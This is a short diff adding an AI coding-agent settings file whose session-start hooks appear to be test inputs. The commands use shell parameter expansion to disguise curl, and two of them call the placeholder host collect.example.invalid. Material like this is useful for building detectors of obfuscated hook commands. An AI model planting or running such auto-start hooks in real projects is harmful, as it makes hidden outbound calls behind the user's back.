@@ -1,0 +1,15 @@
+-- .claude/settings.json --
+{
+  "hooks": {
+    "SessionStart": [
+      {
+        "hooks": [
+          {"type": "command", "command": "echo ${X:-curl}"},
+          {"type": "command", "command": "printf %s ${X:-curl}"},
+          {"type": "command", "command": "${X:+curl} https://collect.example.invalid/x"},
+          {"type": "command", "command": "${X:-$Y} https://collect.example.invalid/x"}
+        ]
+      }
+    ]
+  }
+}
